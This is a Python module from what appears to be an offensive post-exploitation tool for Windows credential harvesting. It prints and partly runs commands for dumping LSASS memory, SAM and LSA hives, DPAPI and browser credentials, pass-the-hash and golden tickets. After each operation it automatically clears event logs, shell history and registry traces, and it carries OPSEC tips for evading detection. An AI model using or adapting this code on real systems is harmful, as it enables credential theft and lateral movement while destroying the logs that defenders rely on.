"""Identity Acquisition Module"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console
from modules.loghunter_integration import WindowsMoonwalk
from modules.utils import select_menu_option, execute_cmd, execute_powershell


class IdentityModule:
    """Module for identity acquisition and credential harvesting"""
    
    def __init__(self):
        self.moonwalk = None
    
    def run(self, console: Console, session_data: dict):
        if not self.moonwalk:
            self.moonwalk = WindowsMoonwalk(console, session_data)
        """Run identity acquisition module"""
        while True:
            console.print(Panel(
                "[bold]Identity Acquisition[/bold]\n\n"
                "Harvest credentials and understand domain context for lateral movement.\n"
                "[dim]Moonwalk: Auto-clearing logs and traces after each operation[/dim]",
                title="Module 3",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            menu_options = [
                {'key': '1', 'label': 'Local Credential Sources [APT-41: Credential Access]'},
                {'key': '2', 'label': 'Credential Store Access [APT-41: Credential Access]'},
                {'key': '3', 'label': 'Configuration Secrets [APT-41: Credential Access]'},
                {'key': '4', 'label': 'User Artifacts [APT-41: Credential Access]'},
                {'key': '5', 'label': 'Domain Context & Delegation [APT-41: Discovery]'},
                {'key': '6', 'label': 'Token & Ticket Extraction [APT-41: Credential Access]'},
                {'key': '7', 'label': 'LSASS Memory Dumping [APT-41: Credential Access]'},
                {'key': '?', 'label': 'Module Guide - Usage instructions and TTPs'},
                {'key': '0', 'label': 'Return to main menu'},
            ]
            
            choice = select_menu_option(console, menu_options, "Select function", default='0')
            
            if choice == '0':
                break
            elif choice == '?':
                self._show_guide(console)
            elif choice == '1':
                self._local_credentials(console, session_data)
            elif choice == '2':
                self._credential_store(console, session_data)
            elif choice == '3':
                self._config_secrets(console, session_data)
            elif choice == '4':
                self._user_artifacts(console, session_data)
            elif choice == '5':
                self._domain_context(console, session_data)
            elif choice == '6':
                self._tokens_tickets(console, session_data)
            elif choice == '7':
                self._lsass_dumping(console, session_data)
            
            # Moonwalk cleanup after credential access operations (enabled by default)
            if choice != '0':
                self._moonwalk_cleanup(console, 'credential_access')
            
            console.print()
    
    def _show_guide(self, console: Console):
        """Show module guide"""
        guide_text = """[bold cyan]Identity Acquisition Module Guide[/bold cyan]

[bold]Purpose:[/bold]
Harvest credentials and understand domain context for lateral movement.

[bold]Key Functions:[/bold]
1. Local Credential Sources - SAM, LSA secrets, cached credentials
2. Credential Store Access - Windows Credential Manager, Vault
3. Configuration Secrets - Config files, registry, service accounts
4. User Artifacts - Browser passwords, saved credentials
5. Domain Context & Delegation - Domain info, trust relationships
6. Token & Ticket Extraction - Kerberos tickets, access tokens
7. LSASS Memory Dumping - Extract credentials from memory

[bold]MITRE ATT&CK TTPs:[/bold]
• T1003 - OS Credential Dumping
• T1555 - Credentials from Password Stores
• T1556 - Modify Authentication Process
• T1078 - Valid Accounts
• T1087 - Account Discovery
• T1003.001 - LSASS Memory

[bold]Usage Tips:[/bold]
• Start with option 1 for local credentials
• Option 5 provides domain context for lateral movement
• Option 6 extracts tokens for pass-the-ticket attacks
• Option 7 (LSASS) requires elevated privileges
• Moonwalk automatically clears credential access traces

[bold]Best Practices:[/bold]
• Extract domain admin credentials when possible
• Use tokens/tickets for stealthy lateral movement
• Document service account credentials
• Clear traces after credential extraction"""
        
        console.print(Panel(guide_text, title="Module Guide", border_style="cyan"))
        console.print()
        Prompt.ask("[dim]Press Enter to continue[/dim]", default="")
    
    def _moonwalk_cleanup(self, console: Console, operation_type: str):
        """Perform moonwalk cleanup after operation"""
        try:
            console.print("\n[yellow]Running moonwalk cleanup...[/yellow]")
            results = self.moonwalk.cleanup_after_operation(operation_type)
            
            if results.get('event_logs', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['event_logs']['cleared'])} event logs[/green]")
            if results.get('powershell_history'):
                console.print("[green]Cleared PowerShell history[/green]")
            if results.get('command_history'):
                console.print("[green]Cleared command history[/green]")
            if results.get('registry_traces', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['registry_traces']['cleared'])} registry traces[/green]")
        except Exception as e:
            console.print(f"[yellow]Moonwalk cleanup error: {e}[/yellow]")
    
    def _local_credentials(self, console: Console, session_data: dict):
        """Explore local credential sources"""
        console.print("\n[bold cyan]Local Credential Sources[/bold cyan]")
        console.print("[dim]TTP: T1003.001 (OS Credential Dumping: LSASS Memory), T1003.002 (Security Account Manager)[/dim]\n")
        
        sources = {
            "Windows Credential Manager": [
                "cmdkey /list",
                "vaultcmd /list",
                "Get-StoredCredential"
            ],
            "LSASS Memory": [
                "Mimikatz: sekurlsa::logonpasswords",
                "Procdump + Mimikatz offline",
                "Task Manager → Dump LSASS"
            ],
            "SAM Database": [
                "reg save HKLM\\SAM sam.save",
                "reg save HKLM\\SYSTEM system.save",
                "Mimikatz: lsadump::sam"
            ],
            "LSA Secrets": [
                "reg save HKLM\\SECURITY security.save",
                "Mimikatz: lsadump::secrets"
            ],
            "DPAPI": [
                "Mimikatz: dpapi::cred",
                "SharpDPAPI",
                "Get-Content $env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Credentials\\*"
            ]
        }
        
        for source, methods in sources.items():
            console.print(f"[bold]{source}:[/bold]")
            for method in methods:
                console.print(f"  • {method}")
            console.print()
    
    def _credential_store(self, console: Console, session_data: dict):
        """Access credential stores"""
        console.print("\n[bold cyan]Credential Store Access[/bold cyan]\n")
        
        stores = [
            ("cmdkey /list", "List stored credentials"),
            ("vaultcmd /list", "Windows Vault credentials"),
            ("[PowerShell] Get-StoredCredential", "PowerShell credential access"),
            ("[PowerShell] $cred = Get-StoredCredential -Target <target>; $cred.GetNetworkCredential()", "Retrieve specific credential"),
        ]
        
        table = Table(title="[bold]Credential Store Commands[/bold]", box=box.ROUNDED)
        table.add_column("Command", style="cyan")
        table.add_column("Purpose", style="white")
        
        for cmd, purpose in stores:
            table.add_row(cmd, purpose)
        
        console.print(table)
        console.print()
        
        console.print("[bold]Target Locations:[/bold]")
        locations = [
            "Current user: %APPDATA%\\Microsoft\\Credentials\\",
            "System: C:\\Windows\\System32\\config\\",
            "Vault: %APPDATA%\\Microsoft\\Vault\\"
        ]
        
        for loc in locations:
            console.print(f"  • {loc}")
    
    def _config_secrets(self, console: Console, session_data: dict):
        """Find configuration secrets"""
        console.print("\n[bold cyan]Configuration Secrets[/bold cyan]\n")
        
        targets = {
            "Application Config Files": [
                "web.config, app.config (connection strings)",
                "*.ini, *.conf files",
                "Environment variables"
            ],
            "Backup Scripts": [
                "Batch files with credentials",
                "PowerShell scripts with plaintext passwords",
                "Scheduled task scripts"
            ],
            "Monitoring Agents": [
                "Nagios, Zabbix configs",
                "SCOM agent configs",
                "Backup agent configs (Veeam, Backup Exec)"
            ],
            "Database Configs": [
                "SQL Server connection strings",
                "MySQL my.cnf",
                "PostgreSQL pg_hba.conf"
            ],
            "Service Configs": [
                "IIS application pool identities",
                "Service account configs",
                "GMSA (Group Managed Service Accounts)"
            ]
        }
        
        console.print("[bold]Search Commands:[/bold]")
        search_cmds = [
            "Get-ChildItem -Recurse -Include *.config,*.ini,*.conf | Select-String -Pattern 'password|pwd|pass' -CaseSensitive:$false",
            "Get-ChildItem -Recurse -Include *.bat,*.ps1,*.vbs | Select-String -Pattern 'password|pwd|pass' -CaseSensitive:$false",
            "Get-Content C:\\ProgramData\\*\\config\\* | Select-String -Pattern 'password|pwd|pass'"
        ]
        
        for cmd in search_cmds:
            console.print(f"  • {cmd}")
        console.print()
        
        for category, items in targets.items():
            console.print(f"[bold]{category}:[/bold]")
            for item in items:
                console.print(f"  • {item}")
            console.print()
    
    def _user_artifacts(self, console: Console, session_data: dict):
        """Harvest user artifacts"""
        console.print("\n[bold cyan]User Artifacts[/bold cyan]\n")
        
        artifacts = {
            "RDP History": [
                "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\"",
                "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\"",
                "Get-ItemProperty \"HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*\""
            ],
            "Cached Logons": [
                "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
                "Mimikatz: lsadump::cache",
                "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
            ],
            "Browser Data": [
                "Chrome: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
                "Edge: %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                "Firefox: %APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\logins.json"
            ],
            "Password Managers": [
                "KeePass: %APPDATA%\\KeePass\\",
                "LastPass: %APPDATA%\\LastPass\\",
                "1Password: %LOCALAPPDATA%\\1Password\\"
            ],
            "SSH Keys": [
                "%USERPROFILE%\\.ssh\\id_rsa",
                "%USERPROFILE%\\.ssh\\id_ed25519",
                "%USERPROFILE%\\.ssh\\config"
            ]
        }
        
        for artifact, locations in artifacts.items():
            console.print(f"[bold]{artifact}:[/bold]")
            for loc in locations:
                console.print(f"  • {loc}")
            console.print()
    
    def _domain_context(self, console: Console, session_data: dict):
        """Understand domain context and delegation"""
        console.print("\n[bold cyan]Domain Context & Delegation[/bold cyan]\n")
        
        console.print("[bold]Domain Information:[/bold]")
        domain_cmds = [
            "net group /domain",
            "net group \"Domain Admins\" /domain",
            "net group \"Enterprise Admins\" /domain",
            "net group \"Schema Admins\" /domain",
            "net group \"Account Operators\" /domain",
            "net group \"Backup Operators\" /domain",
            "[PowerShell] Get-ADDomain",
            "[PowerShell] Get-ADForest"
        ]
        
        for cmd in domain_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Delegation Checks:[/bold]")
        delegation_cmds = [
            "[PowerShell] Get-ADUser -Filter {TrustedForDelegation -eq $true}",
            "[PowerShell] Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}",
            "[PowerShell] Get-ADComputer -Filter {TrustedForDelegation -eq $true}",
            "[PowerShell] Get-ADUser -Properties * | Where-Object {$_.ServicePrincipalName -ne $null}",
            "[PowerShell] Get-ADUser -Properties msDS-AllowedToDelegateTo"
        ]
        
        for cmd in delegation_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Key Questions:[/bold]")
        questions = [
            "Which identities intersect this machine?",
            "What are their group memberships?",
            "Unconstrained/misconfigured delegation?",
            "Service accounts with broad rights?",
            "Where are these identities valid?"
        ]
        
        for q in questions:
            console.print(f"  • {q}")
    
    def _tokens_tickets(self, console: Console, session_data: dict):
        """Extract tokens and tickets"""
        console.print("\n[bold cyan]Token & Ticket Extraction[/bold cyan]")
        console.print("[dim]TTP: T1550.003 (Pass-the-Ticket), T1550.002 (Pass-the-Hash)[/dim]\n")
        
        methods = {
            "Token Manipulation": [
                "Mimikatz: token::whoami",
                "Mimikatz: token::list",
                "Mimikatz: token::elevate",
                "Incognito: list_tokens",
                "RottenPotato / JuicyPotato (if SeImpersonate)"
            ],
            "Kerberos Tickets": [
                "Mimikatz: kerberos::list",
                "Mimikatz: kerberos::golden (golden ticket)",
                "Mimikatz: kerberos::tgt (TGT extraction)",
                "Rubeus: klist",
                "Rubeus: dump",
                "Rubeus: golden /krbtgt:<hash>"
            ],
            "NTLM Hashes": [
                "Mimikatz: sekurlsa::logonpasswords",
                "Mimikatz: lsadump::sam",
                "Mimikatz: lsadump::secrets",
                "Mimikatz: lsadump::dcsync (if DC access)"
            ],
            "Pass-the-Hash": [
                "Mimikatz: sekurlsa::pth /user:<user> /ntlm:<hash>",
                "WMI: wmic /node:<target> /user:<user> /password:<hash> process call create",
                "Psexec with NTLM hash"
            ]
        }
        
        for method, tools in methods.items():
            console.print(f"[bold]{method}:[/bold]")
            for tool in tools:
                console.print(f"  • {tool}")
            console.print()
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1550.002 (Pass-the-Hash): Reuse NTLM hashes for authentication")
        console.print("  • T1550.003 (Pass-the-Ticket): Reuse Kerberos tickets")
        console.print("  • T1550.001 (Application Access Token): Token manipulation")
        console.print("  • Enables lateral movement without cleartext passwords")
        console.print("  • Use with T1021 (Remote Services) for lateral movement")
        
        console.print("\n[bold]Credential Extraction Methods:[/bold]")
        extraction_methods = [
            "Mimikatz for LSASS memory dumping",
            "Procdump + Mimikatz offline analysis",
            "Task Manager → Create dump file",
            "Rundll32 with comsvcs.dll (MiniDump)",
            "WDigest credential extraction"
        ]
        
        for method in extraction_methods:
            console.print(f"  • [yellow]{method}[/yellow]")
        
        console.print("\n[bold]OPSEC Note:[/bold]")
        console.print("  • Use legitimate tools when possible")
        console.print("  • Prefer token manipulation over credential extraction when possible")
        console.print("  • Use built-in Windows mechanisms (runas, etc.)")
        console.print("  • Minimize use of external tools")
    
    def _lsass_dumping(self, console: Console, session_data: dict):
        """LSASS Memory Dumping"""
        console.print("\n[bold cyan]LSASS Memory Dumping[/bold cyan]")
        console.print("[dim]TTP: T1003.001 (OS Credential Dumping: LSASS Memory), T1059.001 (PowerShell)[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]T1003.001 LSASS Dumping Methods:[/bold]")
        methods = {
            "Procdump Method": [
                "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
                "Download dump file",
                "Analyze offline with Mimikatz/PowerShell",
                "Less likely to trigger alerts"
            ],
            "Task Manager Method": [
                "Open Task Manager",
                "Right-click lsass.exe → Create dump file",
                "Analyze dump with Mimikatz/PowerShell",
                "Native Windows tool"
            ],
            "Rundll32 Method": [
                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> lsass.dmp full",
                "Built-in Windows DLL",
                "No external tools required",
                "Less suspicious"
            ],
            "PowerShell (T1059.001)": [
                "Invoke-Mimikatz (PowerShell script)",
                "LSASS readers via PowerShell",
                "In-memory execution",
                "No file drops required"
            ],
            "Mimikatz Direct": [
                "sekurlsa::logonpasswords",
                "sekurlsa::wdigest",
                "sekurlsa::tspkg",
                "Direct memory access (higher risk)"
            ]
        }
        
        for method_name, steps in methods.items():
            console.print(f"[bold]{method_name}:[/bold]")
            for step in steps:
                console.print(f"  • {step}")
            console.print()
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1003.001: Extract credentials from LSASS memory")
        console.print("  • T1059.001: Use PowerShell for credential extraction scripts")
        console.print("  • Credentials enable T1078 (Valid Accounts) and T1550 (Alternate Auth Material)")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        opsec = [
            "Use legitimate tools (procdump, taskmgr) when possible",
            "Dump to disk and analyze offline",
            "Avoid direct Mimikatz execution if possible",
            "Clear dump files after extraction",
            "Use encrypted channels for credential transfer"
        ]
        
        for consideration in opsec:
            console.print(f"  • [yellow]{consideration}[/yellow]")
        
        if is_live or Confirm.ask("\n[bold]Check LSASS process?[/bold]", default=False):
            console.print("\n[yellow]Checking LSASS process...[/yellow]\n")
            
            # Check LSASS process
            ps_cmd = "Get-Process lsass | Select-Object Id, ProcessName, Path, StartTime"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]LSASS Process:[/green]\n{stdout}")
            else:
                console.print(f"[red]Error:[/red] {stderr}")
            
            # Check for SeDebugPrivilege
            ps_cmd = "whoami /priv | Select-String 'SeDebugPrivilege'"
            exit_code, stdout, stderr = execute_cmd(ps_cmd, lab_use=lab_use)
            if exit_code == 0 and stdout.strip():
                console.print(f"[green]SeDebugPrivilege:[/green] Available")
            else:
                console.print("[yellow]SeDebugPrivilege:[/yellow] Not available (may need elevation)")
